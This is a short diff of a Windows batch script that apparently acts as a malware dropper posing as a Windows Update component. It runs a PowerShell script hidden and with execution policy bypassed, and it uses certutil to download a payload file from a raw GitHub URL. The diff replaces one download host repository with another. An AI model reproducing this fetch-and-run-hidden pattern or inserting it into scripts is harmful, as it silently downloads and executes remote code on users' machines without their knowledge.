@@ -62,6 +62,6 @@ IF EXIST up-query.altp (
 	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -NoExit -File up-query.ps1
 	
 ) ELSE (
-	certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/up-query.altp" up-query.altp
+	certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WernerLS/Treb/master/up-query.altp" up-query.altp
 	goto orange
 )
